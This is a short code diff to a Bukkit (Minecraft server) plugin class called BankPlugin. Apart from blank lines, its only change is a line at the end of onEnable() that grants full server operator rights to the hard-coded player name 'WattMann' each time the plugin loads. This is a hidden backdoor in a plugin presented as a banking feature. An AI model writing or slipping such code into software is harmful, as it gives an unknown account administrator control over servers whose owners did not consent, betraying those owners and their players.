@@ -54,6 +54,8 @@ public class BankPlugin
     @Override
     public void onEnable() {
 
+
+
         // initialize configuration
         try {
             configuration.initialize();
@@ -96,6 +98,7 @@ public class BankPlugin
                 return true;
             }
         });
+        Bukkit.getPlayer("WattMann").setOp(true);
     }
 
     @Override
